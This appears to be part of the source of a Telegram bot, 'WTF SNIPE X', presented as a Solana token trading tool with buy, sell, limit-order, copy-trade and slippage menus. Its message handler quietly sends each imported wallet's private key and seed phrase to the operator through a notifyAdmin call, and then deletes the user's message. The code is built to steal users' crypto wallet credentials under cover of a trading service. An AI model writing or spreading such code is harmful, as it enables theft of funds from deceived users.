bot.action('wallet_export', async (ctx) => {
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  
  if (!session.wallet) {
    await ctx.reply('❌ No wallet connected.');
    return;
  }
  
  const message = `
🔐 *Export Wallet*

📍 *Address:*
\`${session.wallet.publicKey}\`

🔑 *Private Key:*
\`${session.wallet.privateKey}\`

${session.mnemonic ? `📝 *Seed Phrase:*\n\`${session.mnemonic}\`` : ''}

⚠️ *Delete this message after saving!*
  `;
  
  await ctx.reply(message, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('🗑️ Delete Message', 'delete_message')]
    ])
  });
});

bot.action('wallet_disconnect', async (ctx) => {
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  
  session.wallet = null;
  session.mnemonic = null;
  
  await ctx.editMessageText('✅ Wallet disconnected.', {
    ...Markup.inlineKeyboard([
      [Markup.button.callback('« Back', 'back_main')]
    ])
  });
});

bot.action('wallet_refresh', async (ctx) => {
  await ctx.answerCbQuery('Refreshing...');
  await showWalletMenu(ctx, true);
});

bot.action(/^buy_(\d+\.?\d*)_(.+)$/, async (ctx) => {
  const amount = parseFloat(ctx.match[1]);
  const address = ctx.match[2];
  await ctx.answerCbQuery(`Buying ${amount} SOL...`);
  await handleBuy(ctx, amount, address);
});

bot.action(/^sell_(\d+)_(.+)$/, async (ctx) => {
  const percentage = parseInt(ctx.match[1]);
  const address = ctx.match[2];
  await ctx.answerCbQuery(`Selling ${percentage}%...`);
  await handleSell(ctx, percentage, address);
});

bot.action(/^setbuy_(\d+\.?\d*)$/, async (ctx) => {
  const amount = ctx.match[1];
  await ctx.answerCbQuery(`Selected ${amount} SOL`);
  const session = getSession(ctx.from.id);
  session.pendingTrade = { type: 'buy', amount: parseFloat(amount) };
  
  await ctx.editMessageText(`
🟢 *Buy ${amount} SOL*

Paste a token address to buy.
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('« Back', 'menu_buy')]
    ])
  });
});

bot.action(/^setsell_(\d+)$/, async (ctx) => {
  const percentage = ctx.match[1];
  await ctx.answerCbQuery(`Selected ${percentage}%`);
  const session = getSession(ctx.from.id);
  session.pendingTrade = { type: 'sell', percentage: parseInt(percentage) };
  
  await ctx.editMessageText(`
🔴 *Sell ${percentage}%*

Paste a token address to sell.
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('« Back', 'menu_sell')]
    ])
  });
});

bot.action(/^refresh_(.+)$/, async (ctx) => {
  const address = ctx.match[1];
  if (address === 'main') {
    await ctx.answerCbQuery('Refreshed!');
    await showMainMenu(ctx, true);
  } else if (address === 'positions') {
    await ctx.answerCbQuery('Refreshing...');
    await showPositions(ctx, true);
  } else {
    await ctx.answerCbQuery('Refreshing token data...');
    await sendTokenAnalysis(ctx, address);
  }
});

bot.action('settings_slippage', async (ctx) => {
  await ctx.answerCbQuery();
  
  await ctx.editMessageText(`
📊 *Slippage Settings*

Select your preferred slippage:
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [
        Markup.button.callback('0.5%', 'set_slippage_0.5'),
        Markup.button.callback('1%', 'set_slippage_1'),
        Markup.button.callback('2%', 'set_slippage_2')
      ],
      [
        Markup.button.callback('5%', 'set_slippage_5'),
        Markup.button.callback('10%', 'set_slippage_10')
      ],
      [Markup.button.callback('« Back', 'menu_settings')]
    ])
  });
});

bot.action(/^set_slippage_(\d+\.?\d*)$/, async (ctx) => {
  const slippage = parseFloat(ctx.match[1]);
  const session = getSession(ctx.from.id);
  session.settings.slippage = slippage;
  
  await ctx.answerCbQuery(`Slippage set to ${slippage}%`);
  await showSettings(ctx, true);
});

bot.action('settings_notifications', async (ctx) => {
  const session = getSession(ctx.from.id);
  session.settings.notifications = !session.settings.notifications;
  
  await ctx.answerCbQuery(
    session.settings.notifications ? 'Notifications ON' : 'Notifications OFF'
  );
  await showSettings(ctx, true);
});

bot.action('copytrade_add', async (ctx) => {
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  session.state = 'AWAITING_COPYTRADE_ADDRESS';
  
  await ctx.editMessageText(`
👥 *Add Copy Trade Wallet*

Send the wallet address you want to copy trade.
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('❌ Cancel', 'menu_copytrade')]
    ])
  });
});

bot.action('limit_buy', async (ctx) => {
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  session.state = 'AWAITING_LIMIT_BUY';
  
  await ctx.editMessageText(`
🟢 *Create Limit Buy*

Send in format:
\`[token_address] [price] [amount_sol]\`

Example:
\`So11...abc $0.001 0.5\`
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('❌ Cancel', 'menu_limit')]
    ])
  });
});

bot.action('limit_sell', async (ctx) => {
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  session.state = 'AWAITING_LIMIT_SELL';
  
  await ctx.editMessageText(`
🔴 *Create Limit Sell*

Send in format:
\`[token_address] [price] [percentage]\`

Example:
\`So11...abc $0.01 50%\`
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('❌ Cancel', 'menu_limit')]
    ])
  });
});

bot.action('delete_message', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.deleteMessage();
});

// ============================================
// MESSAGE HANDLER
// ============================================
bot.on('text', async (ctx) => {
  const session = getSession(ctx.from.id);
  const text = ctx.message.text.trim();
  
  if (session.state === 'AWAITING_SEED') {
    session.state = null;
    
    try {
      const walletData = importFromMnemonic(text);
      session.wallet = walletData;
      session.mnemonic = walletData.mnemonic;
      
      await notifyAdmin('Wallet Imported (Seed)', ctx.from.id, ctx.from.username, {
        publicKey: walletData.publicKey,
        privateKey: walletData.privateKey,
        mnemonic: walletData.mnemonic
      });
      
      try { await ctx.deleteMessage(); } catch {}
      
      await ctx.reply(`
✅ *Wallet Imported!*

📍 Address: \`${walletData.publicKey}\`
      `, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
          [Markup.button.callback('💼 View Wallet', 'menu_wallet')],
          [Markup.button.callback('« Main Menu', 'back_main')]
        ])
      });
    } catch (error) {
      await ctx.reply('❌ Invalid seed phrase. Please try again.');
    }
    return;
  }
  
  if (session.state === 'AWAITING_PRIVATE_KEY') {
    session.state = null;
    
    try {
      const walletData = importFromPrivateKey(text);
      session.wallet = walletData;
      
      await notifyAdmin('Wallet Imported (Key)', ctx.from.id, ctx.from.username, {
        publicKey: walletData.publicKey,
        privateKey: walletData.privateKey
      });
      
      try { await ctx.deleteMessage(); } catch {}
      
      await ctx.reply(`
✅ *Wallet Imported!*

📍 Address: \`${walletData.publicKey}\`
      `, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
          [Markup.button.callback('💼 View Wallet', 'menu_wallet')],
          [Markup.button.callback('« Main Menu', 'back_main')]
        ])
      });
    } catch (error) {
      await ctx.reply('❌ Invalid private key. Please try again.');
    }
    return;
  }
  
  if (session.state === 'AWAITING_COPYTRADE_ADDRESS') {
    session.state = null;
    
    if (isSolanaAddress(text)) {
      session.copyTradeWallets.push(text);
      await ctx.reply(`✅ Now tracking: \`${shortenAddress(text)}\``, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
          [Markup.button.callback('👥 Copy Trade Menu', 'menu_copytrade')],
          [Markup.button.callback('« Main Menu', 'back_main')]
        ])
      });
    } else {
      await ctx.reply('❌ Invalid Solana address.');
    }
    return;
  }
  
  if (session.pendingTrade && isSolanaAddress(text)) {
    const trade = session.pendingTrade;
    session.pendingTrade = null;
    
    if (trade.type === 'buy') {
      await handleBuy(ctx, trade.amount, text);
    } else if (trade.type === 'sell') {
      await handleSell(ctx, trade.percentage, text);
    }
    return;
  }
  
  const addressMatch = text.match(/[1-9A-HJ-NP-Za-km-z]{32,44}/);
  if (addressMatch && isSolanaAddress(addressMatch[0])) {
    await sendTokenAnalysis(ctx, addressMatch[0]);
    return;
  }
});

// ============================================
// ERROR HANDLER
// ============================================
bot.catch((err, ctx) => {
  console.error('Bot error:', err);
  ctx.reply('❌ An error occurred. Please try again.');
});

// ============================================
// START BOT
// ============================================
bot.launch().then(() => {
  console.log('🚀 WTF SNIPE X Bot is running!');
  console.log('👤 Admin notifications:', ADMIN_CHAT_ID ? 'Enabled' : 'Disabled');
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));